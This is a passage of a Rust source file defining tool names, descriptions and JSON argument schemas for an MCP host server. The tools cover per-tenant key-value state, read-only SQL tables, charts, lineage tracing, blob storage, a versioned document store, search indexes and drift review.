             mismatch fails the whole call with state_schema_violation and writes nothing.",
            host_schema(
                json!({
                    "table": {"type": "string", "description": "Name of the declared table to insert into."},
                    "rows": {
                        "type": ["object", "array"],
                        "description": "One row (an object) or several (an array of objects), each \
                            validated against the table's schema.",
                    },
                    "end_user": end_user_arg_schema(),
                }),
                &["table", "rows"],
            ),
        ),
        Tool::new(
            "host.state.query",
            "Read rows from a declared table, optionally filtered (where: \"field op value\", \
             ops = != < <= > >=, clauses joined by ' and '), ordered (order_by: \"field\" or \
             \"field desc\") and capped (limit).",
            host_schema(
                json!({
                    "table": {"type": "string", "description": "Name of the declared table to read from."},
                    "where": {
                        "type": "string",
                        "description": "Optional filter, e.g. \"age > 21\"; ops are != < <= > >=, \
                            clauses joined by ' and '.",
                    },
                    "order_by": {
                        "type": "string",
                        "description": "Optional \"field\" or \"field desc\" to sort by.",
                    },
                    "limit": {"type": "integer", "description": "Max rows to return; optional."},
                    "end_user": end_user_arg_schema(),
                }),
                &["table"],
            ),
        ),
        Tool::new(
            "host.state.delete_rows",
            "Delete rows from a declared table matching an optional where filter (same \
             grammar as host.state.query); omitting where deletes every row in the table.",
            host_schema(
                json!({
                    "table": {
                        "type": "string",
                        "description": "Name of the declared table to delete rows from.",
                    },
                    "where": {
                        "type": ["string", "object"],
                        "description": "Optional filter: a string in host.state.query's grammar, or \
                            an object of field equalities ({\"status\": \"done\"}); omit to delete \
                            every row.",
                    },
                    "end_user": end_user_arg_schema(),
                }),
                &["table"],
            ),
        ),
        // PRD-mcphost-tenant-tables P0 requirements 1-6, P1 requirement 7:
        // per-tenant tables an agent can run real read-only SQL against --
        // a different store from host.state.* above (small KV values and
        // its own hand-rolled filter grammar): reach for host.state.* for a
        // handful of small values, host.table.* when you want real SQL
        // (joins, aggregates, ORDER BY) over rows.
        Tool::new(
            "host.table.create",
            "Declare a table in this tenant's SQL table store -- a different store from \
             host.state.*'s key-value namespace and its own tables: use host.state.* for a \
             handful of small values, host.table.* when you want real SQL (joins, aggregates, \
             read-only queries) over rows. columns is {\"column\": \"text\"|\"integer\"|\"real\"| \
             \"timestamp\"|\"boolean\"|\"json\"}; primary_key, if given, must name one of \
             columns's own entries. Give exactly one of columns (declare an empty table), \
             source_url (an https CSV or JSON Lines file, fetched by the host) or csv_text \
             (the CSV itself, at most 1 MB): the import infers the column types from the first \
             1,000 rows, loads every row and reports rows_imported, rows_skipped, columns and \
             source -- the way to load data when you have no file tool.",
            host_schema_extra(
                json!({
                    "name": {
                        "type": "string",
                        "pattern": crate::tables::IDENT_PATTERN,
                        "description": "Table name to declare.",
                    },
                    "columns": {
                        "type": "object",
                        "description": "Column name to type map, each type one of \
                            text|integer|real|timestamp|boolean|json, e.g. {\"id\": \"integer\"}.",
                    },
                    "primary_key": {
                        "type": "string",
                        "description": "Column name (must be in columns); optional.",
                    },
                    "source_url": import_source_url_schema(),
                    "csv_text": import_csv_text_schema(),
                    "import_id": import_id_schema(),
                }),
                &["name"],
                import_one_of(&["columns", "source_url", "csv_text"]),
            ),
        ),
        Tool::new(
            "host.table.append",
            "Append one row (an object) or several (an array of objects) to a declared table. \
             Each row is validated against the table's schema first -- a type mismatch fails \
             the whole call with table_schema_violation and writes nothing. Instead of rows, \
             give source_url (an https CSV or JSON Lines file, fetched by the host) or csv_text \
             (the CSV itself, at most 1 MB, header row first): each row is coerced to the \
             table's schema, a row that does not fit is skipped, and the result reports \
             rows_imported, rows_skipped and the first three skip reasons (line and column). \
             Exactly one of rows, source_url and csv_text.",
            host_schema_extra(
                json!({
                    "table": {"type": "string", "description": "Name of the declared table to append to."},
                    "rows": {
                        "type": ["object", "array"],
                        "description": "One row (an object) or several (an array of objects), each \
                            validated against the table's schema.",
                    },
                    "source_url": import_source_url_schema(),
                    "csv_text": import_csv_text_schema(),
                    "import_id": import_id_schema(),
                }),
                &["table"],
                import_one_of(&["rows", "source_url", "csv_text"]),
            ),
        ),
        Tool::new(
            "host.table.query",
            "Run a single read-only SQL SELECT (CTEs allowed) against this tenant's own \
             tables. Structurally rejected (not by string matching): anything but exactly one \
             SELECT statement, a result over 1,000 rows, or a query running past 5 seconds -- \
             each refusal names the rule or bound it hit. handle: true materialises the result \
             as a table instead (no row cap), returning a dataset-summary.v1 (row_count, a \
             20-row sample, per-column stats over every row) naming a hdl_<id> you can later \
             reference in FROM or a CTE through this same tool.",
            host_schema(
                json!({
                    "sql": {
                        "type": "string",
                        "description": "A single read-only SELECT statement (CTEs allowed) \
                            over this tenant's own declared tables (or, once materialised, its \
                            own hdl_<id> handles).",
                    },
                    "handle": {
                        "type": "boolean",
                        "description": "Materialise the result as a hdl_<id> table instead of \
                            returning its rows; returns a dataset-summary.v1. Default false.",
                    },
                    "ttl_s": {
                        "type": "integer",
                        "description": "Only with handle: true -- seconds until the handle \
                            expires; default 3600, maximum 86400.",
                    },
                    "limit": {
                        "type": "integer",
                        "minimum": 1,
                        "description": "Return at most this many rows of the result. The \
                            response carries total (exact when the result has at most 10000 \
                            rows) or total_estimate with exact: false.",
                    },
                }),
                &["sql"],
            ),
        ),
        // PRD-mcphost-query-diagnosis P0 requirement 5/AC5: the hint a
        // refused or empty host.table.query call left in its log row, or a
        // fresh recompute when an older row predates this feature.
        Tool::new(
            "host.table.query_diagnose",
            "Return the stored identifier-coverage diagnosis and hint for one host.table.query \
             log row (by log_id from host.table.query_log), recomputed against the current \
             schema if that row predates this feature. Scoped to this tenant's own rows; a \
             log_id belonging to another tenant (or no such row) returns not_found.",
            host_schema(
                json!({
                    "log_id": {
                        "type": "integer",
                        "description": "A log row id from host.table.query_log's entries.",
                    },
                }),
                &["log_id"],
            ),
        ),
        // PRD-mcphost-query-diagnosis P0 requirement 6/AC6: per-tenant
        // query counts, outcome breakdown, latency percentiles, result
        // footprint, and the most common hints over a trailing window.
        Tool::new(
            "host.table.query_stats",
            "Summarize this tenant's own host.table.query calls over a trailing window: \
             queries, ok, empty, refused (by error_code), p50_ms, p95_ms, result_rows_total, \
             est_result_tokens_total, and the top 5 most common hints. window_s defaults to \
             86,400 (24h) and is capped at 604,800 (7d).",
            host_schema(
                json!({
                    "window_s": {
                        "type": "integer",
                        "description": "Trailing window in seconds (default 86400, max 604800).",
                    },
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.table.list",
            "List this tenant's declared tables, each with its current row count, plus the \
             tenant's whole table-store byte usage.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.table.count",
            "Count the rows in a declared table, optionally filtered by a WHERE expression. \
             Returns count (exact integer) when the filtered set has at most 10000 rows; \
             otherwise returns an estimate from sqlite_stat1 with exact: false. Never fetches \
             a row. Respects row policies the same way host.table.query does.",
            host_schema(
                json!({
                    "table": {"type": "string", "description": "Name of the declared table to count."},
                    "where": {"type": "string", "description": "Optional single boolean SQL expression to filter rows (e.g. \"status = 'active'\"). Refused if it contains multiple statements."},
                }),
                &["table"],
            ),
        ),
        Tool::new(
            "host.table.drop",
            "Drop a declared table and every row it holds. Refused as lineage_blocked when a \
             tool, chain, chart, or handle would break, unless confirm: true.",
            host_schema(
                json!({
                    "name": {
                        "type": "string",
                        "description": "Name of the declared table to drop, with every row it holds.",
                    },
                    "confirm": {
                        "type": "boolean",
                        "description": "PRD-mcphost-lineage-blast-radius requirement 7: drop anyway even \
                            though a breaking consumer exists. Ignored when nothing breaking depends on \
                            this table.",
                    },
                }),
                &["name"],
            ),
        ),
        Tool::new(
            "host.table.schema",
            "Return one table's columns, types, row count and byte count, without running a \
             query -- how an agent discovers its own table shape. A table-level or per-column \
             description set via host.table.model_set is included under description wherever \
             one exists.",
            host_schema(
                json!({
                    "table": {"type": "string", "description": "Name of the declared table to describe."},
                }),
                &["table"],
            ),
        ),
        // PRD-mcphost-table-context-and-sql-passthrough requirement 4: the
        // query log host.table.query itself writes to on every call.
        Tool::new(
            "host.table.query_log",
            "List this tenant's own host.table.query call history, newest first: sql (as \
             submitted, truncated to 4096 bytes with truncated: true past that), row_count \
             (null on refusal), duration_ms, error_code and error_message (null on success). \
             Keeps the newest 1,000 calls.",
            host_schema(
                json!({
                    "limit": {"type": "integer", "description": "Max rows to return, 1-200; default 50."},
                    "before_id": {"type": "integer", "description": "Only rows with id less than this, for paging older rows."},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-chart-in-a-minute P0 requirement 3, P1 requirements
        // 6/8: one SQL call returns a chart recommendation, an inline-data
        // Vega-Lite spec, and a caption whose numbers are computed from the
        // rows -- the picture `host.table.query`'s bare rows leave a caller
        // to imagine.
        Tool::new(
            "host.table.chart",
            "Run sql (the same read-only path and caps as host.table.query) and return \
             chart.v1: a result-profile.v1 profile, a mark/encoding recommendation with \
             rationale and alternatives, an inline-data Vega-Lite v5 spec, and a caption whose \
             headline and facts are computed from the rows, never guessed. mark, if given, must \
             be the recommended mark or one of its alternatives -- an unrecognized or \
             disallowed mark (e.g. pie) fails naming the allowed set. share: true stores the \
             chart (evicting this tenant's oldest past 100 stored) and returns a share_url \
             valid 24 hours, no login required.",
            host_schema(
                json!({
                    "sql": {
                        "type": "string",
                        "description": "A single read-only SELECT statement (CTEs allowed) \
                            over this tenant's own declared tables.",
                    },
                    "title": {"type": "string", "description": "Optional chart title."},
                    "mark": {
                        "type": "string",
                        "description": "Override the recommended mark; must be the \
                            recommendation's own mark or one of its alternatives.",
                    },
                    "share": {
                        "type": "boolean",
                        "description": "Store this chart and return share_url; default false.",
                    },
                }),
                &["sql"],
            ),
        ),
        Tool::new(
            "host.table.charts",
            "List this tenant's stored (host.table.chart {share: true}) charts, newest first, \
             each with id, title, created_unix, and expires_unix.",
            host_schema(json!({}), &[]),
        ),
    ]
}

#[inline(never)]
fn host_tools_part_05() -> Vec<Tool> {
    vec![
        // PRD-mcphost-lineage-blast-radius requirements 6/8: "what breaks
        // if this table changes, before it changes" -- a small dependency
        // graph (table/column/tool/chain/document/chart/handle/run nodes)
        // ranking who depends on a node and how badly a change would hurt
        // them.
        Tool::new(
            "host.lineage.blast_radius",
            "Rank every consumer downstream of a node by how badly a change would hurt it: \
             severity (breaking/degrading/none), a suggested action, and observed use.",
            host_schema(
                json!({
                    "id": {
                        "type": "string",
                        "description": "Node id to evaluate the change against, e.g. 'table:orders'.",
                    },
                    "change_kind": {
                        "type": "string",
                        "enum": crate::lineage::graph::ChangeKind::SPELLINGS.iter().map(|(s, _)| *s).collect::<Vec<_>>(),
                        "description": "One of drop, rename, type_change, remove, add (lowercase; typechange and type-change are accepted spellings of type_change).",
                    },
                    "max_depth": {
                        "type": "integer",
                        "description": "Maximum traversal depth downstream of id. Unbounded if omitted.",
                    },
                    "top_n": {
                        "type": "integer",
                        "description": "Maximum ranked consumers to return; default 50. truncated: true \
                            when more were found.",
                    },
                }),
                &["id", "change_kind"],
            ),
        ),
        Tool::new(
            "host.lineage.trace",
            "List everything a node depends on (upstream) and everything that depends on it \
             (downstream). A downstream list over 100 nodes comes back as downstream_count plus a \
             downstream_handle to page through with host.lineage.trace_page.",
            host_schema(
                json!({"id": {"type": "string", "description": "Node id to trace, e.g. 'table:expenses'."}}),
                &["id"],
            ),
        ),
        Tool::new(
            "host.lineage.trace_page",
            "Page through a host.lineage.trace downstream_handle, 50 nodes at a time.",
            host_schema(
                json!({
                    "handle": {"type": "string", "description": "downstream_handle from host.lineage.trace."},
                    "offset": {"type": "integer", "description": "Row offset to start the page at; default 0."},
                }),
                &["handle"],
            ),
        ),
        // PRD-mcphost-result-handles P0 requirement 5: list/drop for the
        // handles host.table.query {handle: true} materialises -- a
        // different lifecycle from a declared host.table.* table (a TTL,
        // a byte quota of its own, eviction), so these are their own
        // tools rather than an argument on host.table.list/drop.
        Tool::new(
            "host.table.handles",
            "List this tenant's live query-result handles (host.table.query {handle: true}), \
             newest first, each with its row_count, bytes, created_unix, expires_unix, \
             last_used_unix and derived_from SQL.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.table.handle_drop",
            "Drop one query-result handle (and its table) before its TTL expires.",
            host_schema(
                json!({
                    "handle": {"type": "string", "description": "The hdl_<id> handle to drop."},
                }),
                &["handle"],
            ),
        ),
        // PRD-mcphost-result-handles P1 requirement 7 (AC8): reuses the
        // existing host.export job/signed-URL machinery for one handle's
        // rows as CSV instead of the whole tenant's data as a tar.gz.
        Tool::new(
            "host.table.handle_export",
            "Export one query-result handle's rows as CSV through a background job, returning \
             a run_id; poll host.runs.get for the signed /exports/{run_id} download URL (valid \
             24h).",
            host_schema(
                json!({
                    "handle": {"type": "string", "description": "The hdl_<id> handle to export."},
                }),
                &["handle"],
            ),
        ),
        // PRD-mcphost-document-store P0 requirements 2-5, P1 requirement 7:
        // a per-tenant document store (text, markdown, JSON, CSV) with a
        // content hash, extracted text, and a per-tenant change watermark
        // the search PRD will index from -- a third data-ish store
        // alongside host.state.*'s KV namespace and host.table.*'s real SQL
        // rows, for whole documents rather than small values or table rows.
        // PRD-mcphost-docs-import-and-stated-boundary R3: the boundary sentence
        // (`docs::DOCS_BOUNDARY`) leads the description.
        Tool::new(
            "host.docs.put",
            format!(
                "{} Write (or, for an already-used name, create a new version of) a document in \
                 this tenant's document store. mime is detected from name and content when \
                 omitted; allowed mimes are text/plain, text/markdown, application/json, \
                 text/csv. content (or content_base64 for arbitrary bytes) must be at most \
                 MCPHOST_DOC_MAX_BYTES (default 2 MiB). Identical content to the current version \
                 is a no-op that repeats the current version. Loading many documents: \
                 host.docs.put_many takes up to 50 per call.",
                crate::docs::DOCS_BOUNDARY
            ),
            host_schema_any(
                json!({
                    "name": {"type": "string", "minLength": 1, "description": "Document name; same name on a later put creates a new version of the same id."},
                    "content": {"type": "string", "description": "Document content as text; use content_base64 instead for arbitrary bytes."},
                    "content_base64": {"type": "string", "description": "Document content, base64-encoded; use content instead for plain text."},
                    "mime": {"type": "string", "enum": crate::docs::ALLOWED_MIMES, "description": "One of text/plain, text/markdown, application/json, text/csv; detected from name/content when omitted."},
                    "metadata": {"type": ANY_JSON_TYPES, "description": "Arbitrary caller metadata stored alongside the document; any JSON value."},
                }),
                &["name"],
                &["content", "content_base64"],
            ),
        ),
        // PRD-mcphost-docs-import-and-stated-boundary R1: up to 50 documents per
        // call, each through `docs::doc_put`, one result row per input.
        Tool::new(
            "host.docs.put_many",
            format!(
                "{} Write up to {max} documents to this tenant's document store in one call. \
                 documents is an array of 1-{max} objects, each the arguments host.docs.put takes \
                 (name, one of content / content_base64, optional mime and metadata); on_conflict \
                 is replace (default: an existing name gets a new version) or skip (an existing \
                 name is left unchanged). Each document is its own write: results has one row per \
                 input, in order, with status stored / replaced / skipped / refused (refused rows \
                 carry the error_code and message host.docs.put would return, e.g. quota_docs), so \
                 one refusal never undoes another and the call itself succeeds. More than {max} \
                 documents is invalid_params and writes nothing.",
                crate::docs::DOCS_BOUNDARY,
                max = crate::docs::PUT_MANY_MAX
            ),
            host_schema(
                json!({
                    "documents": {
                        "type": "array",
                        "minItems": 1,
                        "maxItems": crate::docs::PUT_MANY_MAX,
                        "description": "1-50 documents, each the arguments host.docs.put takes.",
                        "items": {
                            "type": "object",
                            "properties": {
                                "name": {"type": "string", "description": "Document name; same name on a later put creates a new version of the same id."},
                                "content": {"type": "string", "description": "Document content as text; use content_base64 instead for arbitrary bytes."},
                                "content_base64": {"type": "string", "description": "Document content, base64-encoded; use content instead for plain text."},
                                "mime": {"type": "string", "enum": crate::docs::ALLOWED_MIMES, "description": "One of text/plain, text/markdown, application/json, text/csv; detected from name/content when omitted."},
                                "metadata": {"type": ANY_JSON_TYPES, "description": "Arbitrary caller metadata stored alongside the document; any JSON value."},
                            },
                        },
                    },
                    "on_conflict": {"type": "string", "enum": crate::docs::ON_CONFLICT_MODES, "description": "replace (default): an existing name gets a new version; skip: an existing name is left unchanged and reported skipped."},
                }),
                &["documents"],
            ),
        ),
        // PRD-mcphost-blob-put-get-signed-url R1: any file, stored in one
        // call and shared by a signed URL.
        Tool::new(
            "host.blob.put",
            "Store a file of any type under this tenant and get back {id, name, bytes, mime, \
             sha256, url, expires, version}; url is a signed link (valid 24h) that serves the \
             bytes with the stored Content-Type. mime is the explicit one, else sniffed from the \
             name and magic bytes (pdf, png, jpeg, gif, webp, zip, gzip, xlsx, docx, csv, json, \
             txt, md), else application/octet-stream. The same name stores a new version of the \
             same id; identical bytes are a no-op. Rotating the tenant key invalidates \
             outstanding urls. Give exactly one of content_base64 or url (the host fetches it, \
             so the bytes never pass through your context). Ceilings: blob_max_bytes per file, blob_bytes_max in total, \
             blobs_max files -- see host.quickstart limits.plan.",
            host_schema_any(
                json!({
                    "name": {"type": "string", "minLength": 1, "description": "File name; the same name on a later put creates a new version of the same id."},
                    "content_base64": {"type": "string", "pattern": crate::blobs::BASE64_PATTERN, "description": "The file's bytes, base64-encoded; use url instead to have the host fetch them."},
                    "url": {"type": "string", "description": "http(s) URL the host fetches (10 s, at most blob_max_bytes, no redirects); refused for private, loopback, link-local and internal hosts. Use content_base64 instead for bytes you hold."},
                    "mime": {"type": "string", "description": "Content type; sniffed from name and content when omitted."},
                    "ttl_s": {"type": "integer", "minimum": 1, "maximum": crate::blobs::TTL_MAX_SECS, "description": "Seconds until the file expires, 1-31536000 (365 days); omitted = never. After it host.blob.get answers blob_expired and the url answers 410."},
                }),
                &["name"],
                &["content_base64", "url"],
            ),
        ),
        Tool::new(
            "host.blob.touch",
            "Set a stored file to expire ttl_s seconds from now (extends, shortens or revives one the nightly prune has not removed yet). Returns {id, name, expires_at}.",
            host_schema(
                json!({
                    "id": {"type": "string", "description": "Blob id."},
                    "ttl_s": {"type": "integer", "minimum": 1, "maximum": crate::blobs::TTL_MAX_SECS, "description": "Seconds from now until the file expires, 1-31536000 (365 days)."},
                }),
                &["id", "ttl_s"],
            ),
        ),
        Tool::new(
            "host.blob.policy",
            "Set this tenant's blob defaults and read them back: {default_ttl_s, keep_latest_versions, notify_before_s}. \
             default_ttl_s is the expiry a put without ttl_s gets (null = never); keep_latest_versions (1-100) keeps that many \
             versions of one name live and marks older ones expired at write time; notify_before_s > 0 puts one blob.expiring \
             message in the inbox that long before blobs lapse (0 = off). A field you leave out is unchanged; null clears it.",
            host_schema(
                json!({
                    "default_ttl_s": {"type": ["integer", "null"], "description": "Seconds a stored file lives when put gives no ttl_s, 1-31536000; null = never."},
                    "keep_latest_versions": {"type": ["integer", "null"], "description": "Versions of one name kept live, 1-100; null = only the current one."},
                    "notify_before_s": {"type": "integer", "description": "Send a blob.expiring inbox message this many seconds before expiry; 0 = off."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.blob.gc",
            "Preview or run the blob prune. dry_run: true (default) returns {expiring: [{id, name, version, bytes, expires_at}], \
             bytes_total, count} for files expiring within within_s seconds (0 = already expired); dry_run: false deletes the \
             already-expired set now and returns {deleted, bytes_freed}.",
            host_schema(
                json!({
                    "dry_run": {"type": "boolean", "description": "true (default) lists; false deletes the already-expired set."},
                    "within_s": {"type": "integer", "description": "List files expiring within this many seconds; 0 (default) = already expired."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.blob.get",
            "Read a stored file by id or name. as: \"url\" (default) returns the metadata and a \
             fresh signed url, costing no read; as: \"base64\" also returns content_base64, \
             refused with blob_too_large_inline (use host.blob.url) for a file over 1 MiB.",
            host_schema_any(
                json!({
                    "id": {"type": "string", "description": "Blob id; use name instead if you don't have it."},
                    "name": {"type": "string", "description": "Blob name; use id instead if you have it."},
                    "as": {"type": "string", "enum": crate::blobs::GET_AS, "description": "\"url\" (default) or \"base64\" (files up to 1 MiB)."},
                }),
                &[],
                &["id", "name"],
            ),
        ),
        Tool::new(
            "host.blob.list",
            "List this tenant's stored files by name: {blobs: [{id, name, bytes, mime, sha256, \
             version, ...}], count, total_bytes} -- total_bytes is the usage line against \
             blob_bytes_max.",
            host_schema(
                json!({
                    "prefix": {"type": "string", "description": "Only files whose name starts with this."},
                    "limit": {"type": "integer", "description": "Max files to return, 1-1000; default 100."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.blob.delete",
            "Delete a stored file by id: its bytes and row go, and outstanding urls stop working.",
            host_schema(
                json!({"id": {"type": "string", "description": "Blob id to delete."}}),
                &["id"],
            ),
        ),
        Tool::new(
            "host.blob.url",
            "Mint a fresh signed download url for a stored file; ttl_s defaults to 24 h and is at \
             most 7 days (604800).",
            host_schema(
                json!({
                    "id": {"type": "string", "description": "Blob id."},
                    "ttl_s": {"type": "integer", "minimum": 1, "maximum": crate::blobs::URL_TTL_MAX_SECS, "description": "Seconds the url stays valid, 1-604800; default 86400."},
                }),
                &["id"],
            ),
        ),
        Tool::new(
            "host.docs.get",
            "Read a document by id or name -- version defaults to the current one; text: true \
             also returns the extracted plain text this document's mime produced at put time.",
            host_schema_any(
                json!({
                    "id": {"type": "string", "description": "Document id to read; use name instead if you don't have it."},
                    "name": {"type": "string", "description": "Document name to read; use id instead if you have it."},
                    "version": {"type": "integer", "description": "Version to read; defaults to the document's current version."},
                    "text": {"type": "boolean", "description": "Also return the extracted plain text; default false."},
                }),
                &[],
                &["id", "name"],
            ),
        ),
    ]
}

#[inline(never)]
fn host_tools_part_06() -> Vec<Tool> {
    vec![
        Tool::new(
            "host.docs.list",
            "List documents in this tenant's document store. Without since, returns the current \
             live snapshot; with since (a watermark from host.docs.status, 0 for everything), \
             returns every document changed since, including deleted ones (deleted: true).",
            host_schema(
                json!({
                    "since": {"type": "integer", "description": "Return documents changed since this watermark (a host.docs.status seq); omit for the current live snapshot only."},
                    "prefix": {"type": "string", "description": "Only list documents whose name starts with this prefix."},
                    "limit": {"type": "integer", "description": "Max documents to return; default 100."},
                    "cursor": {"description": "Opaque pagination cursor from a previous list call's next_cursor."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.docs.delete",
            "Soft-delete a document by id or name; still visible via host.docs.list {since} \
             with deleted: true.",
            host_schema_any(
                json!({
                    "id": {"type": "string", "description": "Document id to delete; use name instead if you don't have it."},
                    "name": {"type": "string", "description": "Document name to delete; use id instead if you have it."},
                }),
                &[],
                &["id", "name"],
            ),
        ),
        // PRD-mcphost-index-create-from-sources R1/R4: a named index over
        // documents, table columns and urls, built by the background indexer.
        Tool::new(
            "host.index.create",
            "Register a named index over documents, table columns and urls and return at \
             once ({name, sources, status: \"building\"}); the background indexer chunks every \
             source with byte offsets. Poll host.index.status for progress. A fourth index on \
             the free plan is refused quota_index_max.",
            host_schema_checked(
                json!({
                    "name": {"type": "string", "pattern": crate::index::NAME_PATTERN, "description": "Index name, ^[a-z0-9][a-z0-9_-]{0,63}$."},
                    "sources": crate::index::sources_schema(),
                    "chunking": {
                        "type": "object",
                        "description": "Chunk window in bytes; defaults max_chars 1200, overlap_chars 200.",
                        "properties": {
                            "max_chars": {"type": "integer"},
                            "overlap_chars": {"type": "integer"},
                        },
                    },
                }),
                &["name", "sources"],
            ),
        ),
        Tool::new(
            "host.index.status",
            "Build progress of one named index: chunks, pending (sources still being built), \
             lag_seconds, quota.index_chunks_max, and per-source {kind, ref, items, chunks, \
             behind_by, last_error?, paused?}. stale_sources lists [{ref, behind_by, since_s}] \
             for every source whose data moved since it was indexed; empty when current.",
            host_schema(
                json!({"name": {"type": "string", "description": "The index name."}}),
                &["name"],
            ),
        ),
        Tool::new(
            "host.index.list",
            "List this tenant's named indexes: {indexes: [{name, chunks, sources, created_at, lag_seconds}]}.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.index.delete",
            "Delete one named index with its sources and every chunk it holds.",
            host_schema(
                json!({"name": {"type": "string", "description": "The index name."}}),
                &["name"],
            ),
        ),
        Tool::new(
            "host.index.refresh",
            "Force a re-read of an index's sources on the next tick: {name, source?} -- source is \
             one source's ref (a url, table name or document prefix), absent for all of them. \
             Returns {queued: n}. A url source is fetched even if refresh_s has not elapsed, and a \
             url source paused after three failures in a row resumes.",
            host_schema(
                json!({
                    "name": {"type": "string", "description": "The index name."},
                    "source": {"type": "string", "description": "One source's ref; omit for every source."},
                }),
                &["name"],
            ),
        ),
        Tool::new(
            "host.index.query",
            "Lexical search over one named index: up to k hits (default 5, max 50) as {ref, \
             byte_start, byte_end, text, score}. The index block carries name, chunks, pending, \
             lag_seconds and stale_sources [{ref, behind_by, since_s}] -- the sources whose data \
             moved since they were indexed, so the answer may not include it; empty when current.",
            host_schema(
                json!({
                    "name": {"type": "string", "description": "The index name."},
                    "query": {"type": "string", "description": "Words to look for."},
                    "k": {"type": "integer", "minimum": 1, "maximum": crate::index::QUERY_K_MAX, "description": "Hits to return, 1-50, default 5."},
                }),
                &["name", "query"],
            ),
        ),
        Tool::new(
            "host.docs.status",
            "This tenant's document store counters: documents, bytes, text_bytes, the current \
             change watermark, this plan's document/byte quotas, and an index block (mode, \
             indexed_watermark, lag_seconds, pending_documents, chunks, rebuilding, \
             quota_chunks_reached) describing the search index's own freshness. \
             import_paths names how a document gets in (content, content_base64, put_many), \
             put_many_max the most documents one host.docs.put_many takes, and doc_max_bytes \
             the per-document byte cap.",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-docs-semantic-search P0 requirements 2-5, P1
        // requirement 7: ranked passage search over the document store
        // above, kept fresh by a background indexer -- host.docs.search
        // and its own config/reindex controls.
        Tool::new(
            "host.docs.search",
            "Ranked passage search over this tenant's document store. Lexical (BM25) by \
             default, or hybrid (reciprocal rank fusion of lexical and embeddings) once a \
             provider is configured via host.docs.index_config -- falls back to lexical \
             (index.mode: \"lexical-fallback\") if the provider call fails. mode overrides the \
             default: \"lexical\" (never calls the provider), \"embeddings\", or \"hybrid\" \
             (both require a configured provider). Returns [{document_id, name, version, \
             chunk_no, offset, text, score, ranks: {lexical, embeddings}}] -- ranks names each \
             hit's 1-based position in whichever source list(s) found it -- plus an index block \
             naming the mode and how stale the index is.",
            host_schema(
                json!({
                    "query": {"type": "string", "description": "Search query text."},
                    "k": {"type": "integer", "description": "Max results to return, 1-20; default 5."},
                    "mode": {"type": "string", "enum": crate::docs::SEARCH_MODES, "description": "\"auto\" (default), \"lexical\", \"embeddings\", or \"hybrid\". \"embeddings\"/\"hybrid\" without a configured provider is a validation error."},
                    "filter": {
                        "type": "object",
                        "description": "Restrict results to documents matching prefix and/or name.",
                        "properties": {
                            "prefix": {"type": "string", "description": "Only match documents whose name starts with this prefix."},
                            "name": {"type": "string", "description": "Only match this exact document name."},
                        },
                    },
                }),
                &["query"],
            ),
        ),
        Tool::new(
            "host.docs.index_config",
            "Configure this tenant's search index provider. provider: \"none\" (lexical only, \
             the default) or \"openai-compatible\" (endpoint, model, and secret -- a tenant \
             secret name used as the embeddings request's bearer -- all required). Changing \
             config re-indexes every document from scratch in the background.",
            host_schema(
                json!({
                    "provider": {"type": "string", "enum": crate::docs::INDEX_PROVIDERS, "description": "\"none\" or \"openai-compatible\"."},
                    "endpoint": {"type": "string", "description": "Embeddings API URL; required for openai-compatible."},
                    "model": {"type": "string", "description": "Embeddings model name; required for openai-compatible."},
                    "secret": {"type": "string", "description": "Name of a tenant secret (host.secret_set) used as the bearer; required for openai-compatible."},
                    "dims": {"type": "integer", "description": "Expected embedding dimensionality, for documentation purposes."},
                }),
                &["provider"],
            ),
        ),
        Tool::new(
            "host.docs.reindex",
            "Force this tenant's search index to re-chunk (and re-embed, if a provider is \
             configured) one document (document_id) or, without document_id, every document, \
             on the indexer's next tick.",
            host_schema(
                json!({
                    "document_id": {"type": "string", "description": "Reindex only this document; omit to reindex every document."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.docs.purge",
            "Drop stored versions of a document older than older_than_versions versions back \
             from its current one -- get {version: <a dropped version>} then reads not found.",
            host_schema_any(
                json!({
                    "id": {"type": "string", "description": "Document id to purge old versions of; use name instead if you don't have it."},
                    "name": {"type": "string", "description": "Document name to purge old versions of; use id instead if you have it."},
                    "older_than_versions": {"type": "integer", "description": "How many versions back from the current one to keep."},
                }),
                &["older_than_versions"],
                &["id", "name"],
            ),
        ),
        // PRD-mcphost-drift-review requirement 7: when a table note, a
        // table's inferred schema, or a document changes, the affected
        // logged queries/searches are re-run and diffed -- these three
        // tools read and resolve the resulting review items.
        Tool::new(
            "host.drift.reviews",
            "List this tenant's drift review items (a table note, table schema, or document \
             change whose affected logged queries/searches were re-run), newest first. Each \
             entry summarizes a change: changed_count and regressed_count, without the full \
             per-query/search deltas -- call host.drift.review for those.",
            host_schema(
                json!({
                    "open_only": {"type": "boolean", "description": "Only unresolved reviews (reason is still unset); default false."},
                    "limit": {"type": "integer", "description": "Max rows to return, 1-200; default 50."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.drift.review",
            "Return one drift review item in full, including every QueryDelta/SearchDelta: \
             before/after row_count, sample_hash, error_code (queries) or top5/overlap \
             (searches), and which ones changed or regressed.",
            host_schema(
                json!({
                    "item_id": {"type": "string", "description": "The review item's id, from host.drift.reviews."},
                }),
                &["item_id"],
            ),
        ),
        Tool::new(
            "host.drift.resolve",
            "Resolve a drift review item with a reason (e.g. \"cosmetic\"); it then no longer \
             appears under host.drift.reviews(open_only: true), and host.drift.review shows \
             the reason.",
            host_schema(
                json!({
                    "item_id": {"type": "string", "description": "The review item's id, from host.drift.reviews."},
                    "reason": {"type": "string", "description": "Why this review is resolved, e.g. \"cosmetic\" or \"no_change\"."},
                }),
                &["item_id", "reason"],
            ),
        ),
        Tool::new(
            "host.drift.check",
            "Enqueue a drift re-run for target (a declared table or a document name) without \
             waiting for a version change -- a periodic sweep. The next tick produces a review \
             with the current deltas even if nothing has actually changed.",
            host_schema(
                json!({
                    "target": {"type": "string", "description": "Name of a declared table or a document to re-check."},
                }),
                &["target"],
            ),
        ),
        // PRD-mcphost-table-semantic-model requirement 4: the generated
        // semantic model over a declared table -- per column its inferred
        // type/role/null-share/distinct/min-max/top-values, per table its
